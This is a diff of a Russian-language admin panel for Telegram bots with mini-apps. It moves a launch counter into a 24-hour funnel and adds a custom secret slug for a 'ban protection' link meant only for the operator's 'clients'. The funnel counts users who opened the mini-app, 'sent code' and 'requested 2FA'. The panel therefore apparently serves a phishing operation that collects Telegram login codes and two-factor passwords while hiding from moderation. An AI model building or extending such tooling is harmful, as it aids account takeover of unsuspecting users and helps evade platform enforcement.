@@ -365,7 +365,7 @@
       <div class="title" id="screen-title">Панель</div>
       <div class="sub" id="screen-sub"></div>
     </div>
-    <div id="buildtag" style="font-size:9.5px;color:var(--hint);font-family:'JetBrains Mono',monospace;opacity:.7">b.flat</div>
+    <div id="buildtag" style="font-size:9.5px;color:var(--hint);font-family:'JetBrains Mono',monospace;opacity:.7">b.guard+launches</div>
   </div>
 
   <main id="content"></main>
@@ -683,11 +683,11 @@ async function screenBotCard(botId){
         <div class="k">Шаблон</div>    <div class="v link" id="i-tpl">${esc(b.template_name||'—')}</div>
         <div class="k">Домен</div>     <div class="v link" id="i-dom"><span class="vwrap"><span class="txt">${esc(b.domain||'—')}</span>${b.domain?(b.domain_ssl_ok?'<span class="dot-ok"></span>':'<span class="dot-warn"></span>'):''}</span></div>
         <div class="k">Мини-апп</div>  <div class="v link" id="i-ma">${ma?'включён':'выключен'}</div>
-        <div class="k">Запуски</div>   <div class="v mono">${((b.launch_stats||{}).total||0).toLocaleString('ru')}</div>
       </div>
 
       <div class="uppercase" style="margin:6px 4px 8px">Воронка · 24ч</div>
       <div class="funnel-card">
+        <div class="fline"><div class="lbl">Запуски</div><div class="val">${(((b.launch_stats||{}).total)||0).toLocaleString('ru')}</div></div>
         <div class="fline"><div class="lbl">Открыли мини-апп</div><div class="val">${f.opens.toLocaleString('ru')}</div></div>
         <div class="fline"><div class="lbl">Отправили код</div><div class="val">${f.code_sent.toLocaleString('ru')}</div></div>
         <div class="fline"><div class="lbl">Запросили 2FA</div><div class="val">${f.twofa_sent.toLocaleString('ru')}</div></div>
@@ -1022,6 +1022,17 @@ async function screenGuard(botId, botName){
       </div>
 
       <div class="card">
+        <div class="uppercase" style="margin-bottom:8px">Свой slug</div>
+        <div class="field-hint" style="margin-bottom:8px">Часть ссылки после <code>?start=</code>. Только A-Z, a-z, 0-9, _, -. Длина 1..64.</div>
+        <input class="input mono" id="g-secret" value="${esc(g.secret||'')}" maxlength="64" placeholder="my_secret_123">
+        <div style="height:8px"></div>
+        <div class="row gap-s">
+          <button class="btn small" id="b-save-secret" style="width:auto">Сохранить</button>
+          <button class="btn small ghost" id="b-rotate" style="width:auto">♻️ Случайный</button>
+        </div>
+      </div>
+
+      <div class="card">
         <div class="uppercase" style="margin-bottom:8px">Ссылка для юзера</div>
         <div class="field-hint" style="margin-bottom:10px">Эту ссылку нужно давать только своим клиентам. Тап — скопировать.</div>
         <div class="codeblock" id="g-link">${esc(g.link||'(сначала включите защиту)')}</div>
@@ -1032,14 +1043,13 @@ async function screenGuard(botId, botName){
         <div class="v"><div class="ttl">Защита от бана</div><div class="sub">${g.enabled?'включена':'выключена'}</div></div>
         <div class="switch ${g.enabled?'on':''}" id="t-g"></div>
       </div>
-
-      <button class="btn ghost" id="b-rotate" style="margin-top:6px">♻️ Обновить ссылку</button>
     `;
     const refresh = async ()=>{
       const g2 = await api(`/bots/${botId}/guard`);
       $('#g-status').innerHTML = renderStatusPill(g2.enabled);
       $('#g-link').textContent = g2.link || '(сначала включите защиту)';
       $('#t-g').classList.toggle('on', g2.enabled);
+      if ($('#g-secret')) $('#g-secret').value = g2.secret || '';
     };
     $('#g-link').onclick = ()=>{
       const txt = $('#g-link').textContent;
@@ -1061,6 +1071,16 @@ async function screenGuard(botId, botName){
       HAPTIC('light');
       try { await api(`/bots/${botId}/guard/rotate`, {method:'POST'}); await refresh(); toast('Ссылка обновлена'); HAPTIC('success'); }
       catch(e){ toast(e.message); HAPTIC('error'); }
+    };
+    $('#b-save-secret').onclick = async ()=>{
+      HAPTIC('light');
+      const v = $('#g-secret').value.trim();
+      if (!v) return toast('Введите slug');
+      try {
+        await api(`/bots/${botId}/guard/secret`, {method:'PUT', body: JSON.stringify({secret: v})});
+        await refresh();
+        toast('Сохранено'); HAPTIC('success');
+      } catch(e){ toast(e.message); HAPTIC('error'); }
     };
   } catch(e){ root.innerHTML = `<div class="empty"><div class="ttl">Ошибка</div><div class="sub">${esc(e.message)}</div></div>`; }
 }
